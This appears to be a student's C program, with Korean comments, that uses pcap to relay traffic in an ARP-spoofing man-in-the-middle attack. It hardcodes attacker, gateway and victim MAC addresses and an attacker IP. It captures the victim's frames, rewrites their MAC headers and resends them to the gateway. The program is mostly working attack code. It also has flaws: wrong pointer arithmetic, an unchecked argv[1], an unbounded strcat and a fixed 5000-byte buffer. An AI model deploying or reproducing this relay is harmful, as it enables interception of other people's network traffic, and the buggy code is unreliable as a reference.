#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <pcap.h>
#include <stdio.h>
#include <string.h>

#define MAC_ADDR_LEN 6
#define IP_ADDR_LEN 4
#define BUF_SIZE 100
#define SNAPLEN 65536
#define ARP_HEADER_JMP 14


pcap_t *use_dev;

//이더넷 헤더
#pragma pack(push, 1)
struct ethernet_header {
	unsigned char dest_mac[MAC_ADDR_LEN];
	unsigned char src_mac[MAC_ADDR_LEN];
	unsigned short eth_type;
};
#pragma pack(pop)
//arp 헤더
#pragma pack(push, 1)

struct arp_header {
	unsigned short hardware_type;
	unsigned short protocol_type;
	unsigned char hardware_length;
	unsigned char protocol_length;
	unsigned short opcode;
	unsigned char sender_mac[MAC_ADDR_LEN];
	unsigned char sender_ip[IP_ADDR_LEN];
	unsigned char target_mac[MAC_ADDR_LEN];
	unsigned char target_ip[IP_ADDR_LEN];
};
#pragma pack(pop)

//함수선언
void print_ether_header(const unsigned char *pkt_data);
void print_arp_header(const unsigned char *pkt_data);

//main 시작
int main(int argc, char **argv) {
	//네트워크 장치 불러옴
	pcap_if_t *alldevs = NULL;
	pcap_if_t *dev;
	struct arp_header *ah;
	struct ethernet_header *eh;

	unsigned char ATTACK_MAC[MAC_ADDR_LEN] = { 0x00,0xe0,0x4c,0x61,0xc8,0x1f };
	unsigned char GATEWAY_MAC[MAC_ADDR_LEN] = { 0x00,0x01,0x36,0xf4,0x54,0x97 };
	unsigned char ATTACK_IP[IP_ADDR_LEN] = { 192,168,25,16 };
	//랩실
	unsigned char VICTIM_MAC[MAC_ADDR_LEN] = { 0x00,0x0c,0x29,0x18,0x38,0x4b };
	//우분투
	//unsigned char VICTIM_MAC[MAC_ADDR_LEN] = { 0x00,0x0c,0x29,0x18,0x38,0x4b };

	char errbuf[BUF_SIZE];
	char FILTER_RULE[BUF_SIZE] = "arp";
	struct bpf_program rule_struct;
	int i, dev_num, res;
	struct pcap_pkthdr *header;
	const unsigned char *pkt_data;

	if (argv[1]) {
		strcpy(FILTER_RULE, "port ");
		strcat(FILTER_RULE, argv[1]);
	}

	if (pcap_findalldevs(&alldevs, errbuf) < 0) {
		printf("Device Find Error\n");
		return -1;
	}

	for (dev = alldevs, i = 0; dev != NULL; dev = dev->next) {
		printf("%d번 Device : %s (%s)\n", ++i, dev->name, dev->description);
	}
	printf("사용할 디바이스 번호 입력 : ");
	scanf("%d", &dev_num);

	for (dev = alldevs, i = 0; i < dev_num - 1; dev = dev->next, i++);

	if ((use_dev = pcap_open_live(dev->name, SNAPLEN, 1, 1000, errbuf)) == NULL) {
		printf("pcap_open ERROR!\n");
		pcap_freealldevs(alldevs);
		return -1;
	}
	printf("pcap_open 성공!\n");
	// pcap_open success!

	//if (pcap_compile(use_dev, &rule_struct, FILTER_RULE, 1, NULL) < 0) {
	//	printf("pcap_compile ERROR!\n");
	//	pcap_freealldevs(alldevs);
	//	return -1;
	//}

	//if (pcap_setfilter(use_dev, &rule_struct) < 0) {
	//	printf("pcap_setfilter ERROR!\n");
	//	pcap_freealldevs(alldevs);
	//	return -1;
	//}

	//pcap_freealldevs(alldevs);


	while (1) {
		res = pcap_next_ex(use_dev, &header, &pkt_data);
		if (res <= 0) continue;

		eh = (struct ethernet_header *)pkt_data;

		//ah = (struct arp_header *)pkt_data + 14;

		/*print_ether_header(pkt_data);
		pkt_data += ARP_HEADER_JMP;
		print_arp_header(pkt_data);*/
		/*if (eh->src_mac[0] == 0x00
			&& eh->src_mac[1] == 0x0c
			&& eh->src_mac[2] == 0x29
			&& eh->src_mac[3] == 0x18
			&& eh->src_mac[4] == 0x38
			&& eh->src_mac[5] == 0x4b)*/
			if (eh->src_mac[0] == VICTIM_MAC[0]
				&& eh->src_mac[1] == VICTIM_MAC[1]
				&& eh->src_mac[2] == VICTIM_MAC[2]
				&& eh->src_mac[3] == VICTIM_MAC[3]
				&& eh->src_mac[4] == VICTIM_MAC[4]
				&& eh->src_mac[5] == VICTIM_MAC[5])
		{
			if (ntohs(eh->eth_type) == 0x0800) {
				ah = (struct arp_header *)pkt_data + 14;
				if (ah->target_ip[3] != ATTACK_IP[3])
				{
					

					//memcpy(eh->src_mac, ATTACK_MAC, sizeof(eh->src_mac));
					//memcpy(eh->dest_mac, GATEWAY_MAC, sizeof(eh->dest_mac));
					//memcpy(pkt_data, &eh, sizeof(eh));
					//header->len += sizeof(eh);
					//sizeof(eh->src_mac), sizeof(eh->dest_mac)값 을
					memcpy(eh->src_mac, ATTACK_MAC, 6);
					memcpy(eh->dest_mac, GATEWAY_MAC, 6);

					u_char temp[5000];
					//sizeof(*eh)값 14로 값 넣어줌
					//memcpy(temp, eh, sizeof(*eh));
					//memcpy(temp + sizeof(*eh), pkt_data + sizeof(*eh), header->len - sizeof(*eh));
					memcpy(temp, eh, 14);
					memcpy(temp + 14, pkt_data + 14, header->len - 14);

					printf("forwarding\n");
					pcap_sendpacket(use_dev, temp, header->len);

				}
			}
			else {

				//memcpy(eh->src_mac, ATTACK_MAC, sizeof(eh->src_mac));
				//memcpy(eh->dest_mac, GATEWAY_MAC, sizeof(eh->dest_mac));
				memcpy(eh->src_mac, ATTACK_MAC, 6);
				memcpy(eh->dest_mac, GATEWAY_MAC, 6);

				u_char temp[5000];
				//memcpy(temp, eh, sizeof(*eh));
				//memcpy(temp + sizeof(*eh), pkt_data + sizeof(*eh), header->len - sizeof(*eh));
				memcpy(temp, eh, 14);
				memcpy(temp + 14, pkt_data +14, header->len - 14);

				printf("forwarding\n");
				printf("send packet\n");
				pcap_sendpacket(use_dev, temp, header->caplen);
			}
		}

	}

	return 0;
	
}